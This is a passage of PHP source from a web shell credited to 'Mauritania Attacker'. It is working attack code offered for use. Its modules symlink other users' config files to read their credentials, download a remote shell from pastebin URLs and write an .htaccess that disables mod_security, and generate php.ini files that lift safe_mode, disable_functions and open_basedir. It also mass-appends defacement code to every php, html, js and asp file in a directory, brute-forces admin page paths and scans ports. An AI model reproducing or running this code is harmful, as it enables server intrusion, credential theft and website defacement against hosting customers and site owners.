disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE ");
echo'
<form method="post">
<input type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input type="text" name="ghostfile" value="config.txt" size="60"/><br /><br />
<input type="submit" value="Bypass" name="symlink" /> <br /><br />
</form>
';
echo '<div class="tul"><b>PHP VERSION:</b> <font color="white" face="shell, Geneva, sans-serif" style="font-size: 8pt">';echo phpversion();

$fichier = $_POST['file'];
$ghostfile = $_POST['ghostfile'];
$symlink = $_POST['symlink'];

if ($symlink)
{


$dir = "mauritania";
if(file_exists($dir)) {
echo "<br><font color='red'>[+] mauritania Folder Already Exist _ are you Drunk XD !!!</font><br />";
} else {
@mkdir($dir); {
echo '<br><b class="cont" align="center"><b class="font-effect-fire-animation" style=font-family:Ubuntu;font-size:12px;color:white;>\!/ mauritania Folder Created ^_^ \!/  </b></b>';
echo '<br><b class="cont" align="center"><b class="font-effect-fire-animation" style=font-family:Ubuntu;font-size:12px;color:white;>File Retrieved Successfully</b></b>';

} }

			
$priv9  = "#Priv9 htaccess By Mauritania Attacker
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
DirectoryIndex $ghostfile
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
SetEnv PHPRC ".dirname(__FILE__)."/mauritania/php.ini
suPHP_ConfigPath ".dirname(__FILE__)."/mauritania/php.ini
";
$f =@fopen ('mauritania/.htaccess','w');
@fwrite($f , $priv9);

@symlink("$fichier","mauritania/$ghostfile");

echo '<br /><a target="_blank" href="mauritania/" ><font color="white" size"12">'.$ghostfile.'</a></font>';
}
}
if(isset($_GET['action']) && $_GET['action'] == 'smod14'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass SafeMode 2014 Priv8</span><br>Coded by Mauritania Attacker<center><br><br>';
echo "<br><form method='POST'>
<center><font color='#007700' size='2' face='shell'>Cwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='zero' value=".dirname(__FILE__)." &lt;font color='#b0b000' size='8' face='Tahoma'></font></center>
<center><font color='#007700' size='2' face='shell'>Shell&nbsp;&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='shell' value='http://pastebin.com/raw.php?i=2gmt5XFH' &lt;font color='#b0b000' size='8' face='Tahoma'></font></center>
<center><font color='#007700' size='2' face='shell'>ini.php&nbsp;</font><input type='text' size='40' name='rim' value='http://pastebin.com/raw.php?i=sEbXwVvt' &lt;font color='#b0b000' size='8' face='Tahoma'></font></center><br>
<center><input type='submit' value='Bypass SafeMode' name='start' ><br></font></center><br>";
echo "<center><textarea class='area' rows='12' cols='60'>Results Will Appear Here ^_^ 
";
if($_POST['start']) {
$zero = $_POST['zero'];
$file = $_POST['shell'];
$mauritania = $_POST['rim'];
$htaccess = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC $zero/ghost/php.ini";

$phpini = "c2FmZV9tb2RlID0gT0ZGDQpTYWZlX21vZGVfZ2lkID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCmRpc2FibGVfY2xhc3NlcyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0Kc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkU=";
$dir = "ghost"; 
if(file_exists($dir)) {
echo "[+] ghost Folder Already Exist are you drunk :o xD !
";
} else {
@mkdir($dir); {
echo "[+] ghost Folder Has Been Created Nygga :3 !
";
} }
#Generate Sh3LL
$fopen = fopen("ghost/priv8.php5",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "Shell Has Been Downloaded : $zero/ghost/priv8.php5 
";
} else {
echo "Can't Download Shell :( do it manually :D 
";
}
fclose($fopen);
#Generate Htaccess
$kolsv = fopen("ghost/.htaccess", "w");
$hwrite = fwrite($kolsv, $htaccess);
if($hwrite){
echo ".htaccess Generated Successfully \!/";
} else {
echo "Can't Generate Htaccess";
}
fclose($kolsv);
#Generate ini.php
$xopen = fopen("ghost/ini.php",'w');
$rim = @file_get_contents($mauritania);
$zzz = fwrite($xopen ,$rim);
if($zzz){
echo "ini.php Has Been Downloaded \!/";
} else {
echo "Can't Download ini.php :( do it manually :D ";
}
fclose($xopen);
	
$ini = fopen("ghost/php.ini" ,"w");
$php = fwrite($ini, base64_decode($phpini));
if($php){
echo "PHP.INI Generated Successfully \!/";
} else {
echo "[-] Can't Generate PHP.INI";
}
}
echo "</textarea></center>";
}
if(isset($_GET['action']) && $_GET['action'] == 'setphr'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass suPHP Security</span><center><br>';
echo '<center><form method=post><br><br>
<input type=submit name=gnr value="Generate htaccess" /></form></center>';
          
error_reporting(0);
            
if(isset($_POST['gnr']))
{
mkdir('suPHP',0755);
$rr  = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
<Limit GET POST> 
order deny,allow 
deny from all 
allow from all 
</Limit> 
<Limit PUT DELETE> 
order deny,allow 
deny from all 
</Limit> 
suPHP_ConfigPath ".getcwd()."/php.ini";
$g = fopen('suPHP/.htaccess','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">.htaccess Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
}
echo '<center><form method=post><br><br>
<input type=submit name=gnrp value="Generate php.ini" /></form></center>';
error_reporting(0);
            
if(isset($_POST['gnrp']))
{
mkdir('suPHP',0755);
$rr  = "safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE";
$g = fopen('suPHP/php.ini','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">php.ini Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
		
}
}
if(isset($_GET['action']) && $_GET['action'] == 'suppet'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Functions suPHP_ConfigPath Security</span><center><br>';
echo '<center><form method=post><br><br>
<input type=submit name=gnr value="Generate htaccess" /></form></center>';
          
error_reporting(0);
            
if(isset($_POST['gnr']))
{
mkdir('suPHP2',0755);
$rr  = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
<Limit GET POST> 
order deny,allow 
deny from all 
allow from all 
</Limit> 
<Limit PUT DELETE> 
order deny,allow 
deny from all 
</Limit> 
suPHP_ConfigPath ".getcwd()."/php.ini";
$g = fopen('suPHP2/.htaccess','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">.htaccess Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP2/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
}
echo '<center><form method=post><br><br>
<input type=submit name=gnrp value="Generate php.ini" /></form></center>';
error_reporting(0);
            
if(isset($_POST['gnrp']))
{
mkdir('suPHP2',0755);
$rr  = "safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF";
$g = fopen('suPHP2/php.ini','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">php.ini Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP2/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
		
}
}

if(isset($_GET['action']) && $_GET['action'] == 'mass'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
if(!isset($_GET['code'])){

?><?php
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Mass Deface Dirs</span><br><form action="" method="get">
<center><br>Mass deface script, php/html/htm/asp/aspx/js</center><br><input type="hidden" name="action" value="mass">
<textarea name="code" id="source">YOUR DEFACE PAGE HERE =)</textarea><br><br>
<font color="#ee5500">Folder:</font> <input type="text" value="'.getcwd().'" name="dir" style="border-top:none;"> <input type="submit" value="Execute" style="border-top:none;"></center>
</form>';
}
else{

if (is_dir($_GET['dir'])) {
$lolinject = $_GET['code'];
foreach (glob($_GET['dir']."/*.php") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.html") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.htm") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.asp") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.js") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
foreach (glob($_GET['dir']."/*.aspx") as $injectj00) {
$fp=fopen($injectj00,"a+");
if (fputs($fp,$lolinject)){
echo $injectj00.' was injected<br>';
} else {
echo '<font color=red>failed to inject '.$injectj00.'</font>';
}
}
} else { //end if inputted dir is real -- if not, show an ugly red error
echo '<b><font color=red>'.$_GET['pathtomass'].' is not available!</font></b>';
} // end if inputted dir is real, for real this time
}
}

if(isset($_GET['action']) && $_GET['action'] == 'admnpgfndr'){
echo '<center><b class="conte">
<a href="?action=shellfnderr">Shell Finder</a> -
<a href="?action=jcescnr">Jce Scanner</a> -
<a href="?action=jcemultiscnner">JCE Multi-Uploader</a> -
<a href="?action=portscnnre">Port Scanner</a> -
<a href="?action=admnpgfndr">Admin Page Finder</a> -
<a href="?action=srchffilsses">Search Files</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Admin Page Finder</span><center><br>';
set_time_limit(0);
error_reporting(0);
$list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
$list['end'] = "admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
function template() {
echo '
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin page Finder by k[N]i[g]Ht</title>
<style type="text/css">
body{
background: #222222;
margin: 0;
padding: 0;
padding-top: 10px;
color: #FFF;
font-family: Calibri;
font-size: 13px;
}
a{
color: #FFF;
text-decoration: none;
font-weight: bold;
}
.wrapper{
width: 1000px;
margin: 0 auto;
}
.tube{
padding: 10px;
}
.red{
width: 998px;
border: 1px solid #007700;
background: #222222;
color: #009900;
box-shadow: 0px 0px 4px #007700;
}
.red input{
background: #000;
border: 1px solid #007700;
color: #FFF;
}
.blue{
float: left;
width: 1000px;
border: 1px solid #007700;
background: #222222;
color: #00bb00;
box-shadow: 0px 0px 4px #007700;
}
.green{
float: left;
width: 1000px;
border: 1px solid #007700;
background: #222222;
color: #009900;
box-shadow: 0px 0px 4px #007700;
}
input[type=submit]{ padding: 3px; color: #222222; text-shadow:#000 0px 0px 4px; font-weight: bold; border: 1px solid #007700; background: #ababab; box-shadow: 0px 0px 4px #007700;    padding: 3px; -webkit-border-radius: 4px;   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(0,119,0) 0px 0px 4px;   -moz-box-shadow: rgb(0,119,0) 0px 0px 4px;}
input[type=text]{ padding: 3px; color: #009900; text-shadow: #007700 0px 2px 7px; border: 1px solid #007700; background: transparent; box-shadow: 0px 0px 4px #007700;    padding: 3px;   -webkit-border-radius: 4px;
   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(0,119,0) 0px 0px 4px;   -moz-box-shadow: rgb(0,119,0) 0px 0px 4px;}
input[type=submit]:hover, input[type=text]:hover{ color: #e4e4e4; text-shadow: #00bb00 0px 0px 4px; box-shadow: 0px 0px 4px #00bb00; border: 1px solid #00bb00;    padding: 3px;   -webkit-border-radius: 4px;
   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgba(0,221,0) 0px 0px 4px;   -moz-box-shadow: rgba(0,221,0) 0px 0px 4px;}
</style>
<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
var $this = $text;
var logbox = document.getElementById($place);
if($replace == 0)
document.getElementById($place).innerHTML = logbox.innerHTML+$this;
else
document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
</head>
<body>
<br />
<br />
<div class="wrapper">
<div class="red">
<div class="tube">
<form action="" method="post" name="xploit_form"><b>
URL :</b><br /><input type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 100%;" /><br /><br />
<b>404string :</b><br /><input type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 100%;" /><br /><br />
<span style="float: right;"><input type="submit" name="xploit_submit" value="Find Admin Page" align="right" /></span><br />
</form>
<br />
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
Found ones:<br />
</div> <!-- /tube -->
</div> <!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder<br />
PHP Version<br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all">';
}
function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
if($br == 1) $msg .= "<br />";
echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
if($stop == 1) exit;
@flush();@ob_flush();
}
function check($x, $front=0) {
global $_POST,$site,$false;
if($front == 0) $t = $site.$x;
else $t = 'http://'.$x.'.'.$site.'/';
$headers = get_headers($t);
if (!eregi('200', $headers[0])) return 0;
$data = @file_get_contents($t);
if($_POST['xploit_404string'] == "") if($data == $false) return 0;
if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
return 1;
}
	
// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
template();
if(!isset($_POST['xploit_url'])) die;
if($_POST['xploit_url'] == '') die;
$site = $_POST['xploit_url'];
if ($site[strlen($site)-1] != "/") $site .= "/";
if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
$list['end'] = str_replace("\r", "", $list['end']);
$list['front'] = str_replace("\r", "", $list['front']);
$pathes = explode("\n", $list['end']);
$frontpathes = explode("\n", $list['front']);
show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
$verificate = 0;
foreach($pathes as $path) {
show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
$verificate++; show($verificate, 0, 0, 'verified', 1);
if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
else{
show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
}
}
preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
if(substr($site, 0, 3) == "www") $site = substr($site, 4);
foreach($frontpathes as $frontpath) {
show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
$verificate++; show($verificate, 0, 0, 'verified', 1);
if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
else{
show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
}
}
}
if(isset($_GET['action']) && $_GET['action'] == 'portscnnre'){
echo '<center><b class="conte">
<a href="?action=shellfnderr">Shell Finder</a> -
<a href="?action=jcescnr">Jce Scanner</a> -
<a href="?action=jcemultiscnner">JCE Multi-Uploader</a> -
<a href="?action=portscnnre">Port Scanner</a> -
<a href="?action=admnpgfndr">Admin Page Finder</a> -
<a href="?action=srchffilsses">Search Files</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Port Scanner</span><center><br>';
echo '<title>Port Scanner';
echo '</title>';

$addr = $_SERVER["REMOTE_ADDR"];
$port = "80";
if ($_GET["addr"]) {
$addr = $_GET["addr"];
}
if ($_GET["port"]) {
$port = $_GET["port"];
}
if ($_GET["port2"]) {
$port2 = $_GET["port2"];
}

echo '<form action="' .$_SERVER["PHP_SELF"]. '" method="get">
<center>
<div style="width:300px;background:transparent;padding:10px;font-family:arial;">
<table width="100%" border="0" cellspacing="0" cellpadding="2">
<tr>
<td colspan="2" style="font-size:12px; color:#007700;">Please enter a website or IP and port of the website or IP address you wish to scan.</td>
</tr>
<tr>
<td width="30%" style="font-size:12px; color:#007700;"><br>Address/IP</td>
<td width="80%"><br><input type="text" name="addr" value="' .$addr. '"></td>
</tr>
<tr>
<td width="30%" style="font-size:12px; color:#007700;"><br>Port</td>
<td width="80%"><br><input type="text" name="port" value="' .$port. '"></td>
</tr>
<tr>
<td width="30%" style="font-size:12px; color:#009900;"><br>Result</td>
<td width="80%"><br><input type="text" name="port2" value="' .$port2. '"></td>
</tr>
<td width="30%"> </td>
<td width="80%"><br><input type="submit" value="Scan Port(s)"></td>
</tr>
</table>
</div>
</form>
</center>
';

if ($_GET["addr"]) {
if ($_GET["port"] && !$_GET["port2"]) {
$fp = @fsockopen($addr, $port, $errno, $errstr, 2);
$success = "#FF0000";
$success_msg = "is closed.";
if ($fp) {
$success = "#99FF66";
$success_msg = "is open.";
}
@fclose($fp);
echo '<div style="width:300px;background:' .$success. ';padding:10px;font-family:arial;font-size:12px;">
The address <b>"' .$addr. ':' .$port. '"</b> ' .$success_msg. '
</div>';
}
else if ($_GET["port"] && $_GET["port2"]) {
$p1 = $_GET["port"];
$p2 = $_GET["port2"];
if ($p1 == $p2) {
$fp = @fsockopen($addr, $port, $errno, $errstr, 2);
$success = "#FF0000";
$success_msg = "is closed.";
if ($fp) {
$success = "#99FF66";
$success_msg = "is open.";
}
@fclose($fp);
echo '<div style="width:300px;background:' .$success. ';padding:10px;font-family:arial;font-size:12px;">
The address <b>"' .$addr. ':' .$port. '"</b> ' .$success_msg. '
</div>';
}
else {
if ($p1 < $p2) {
$s = $p1;
$st = $p1;
$e = $p2;
}
else if ($p2 < $p1) {
$s = $p2;
$st = $p2;
$e = $p1;
}
while ($s <= $e) {
$fp = @fsockopen($addr, $s, $errno, $errstr, 1);
if ($fp) {
$p_open = $p_open. " " .$s;
$p_1 = 1;
}
@fclose($fp);
$s++;
}
if ($p_1) {
$c = "#99FF66";
$m = "On the address <b>" .$addr. "</b> and port range <b>" .$st. "-" .$e. "</b> the following ports were open: " .$p_open;
}
else {
$c = "#FF0000";
$m = "No ports on the address <b>" .$addr. "</b> and port range <b>" .$st. "-" .$e. "</b> were open";
}
echo '<div style="width:300px;background:' .$c. ';padding:10px;font-family:arial;font-size:12px;">' .$m. '</div>';
}
}
}
}

if(isset($_GET['action']) && $_GET['action'] == 'shellfnderr'){
echo '<center><b class="conte">
<a href="?action=shellfnderr">Shell Finder</a> -
<a href="?action=jcescnr">Jce Scanner</a> -
<a href="?action=jcemultiscnner">JCE Multi-Uploader</a> -
<a href="?action=portscnnre">Port Scanner</a> -
<a href="?action=admnpgfndr">Admin Page Finder</a> -
<a href="?action=srchffilsses">Search Files</a> </center>
</b>';
echo'<center>
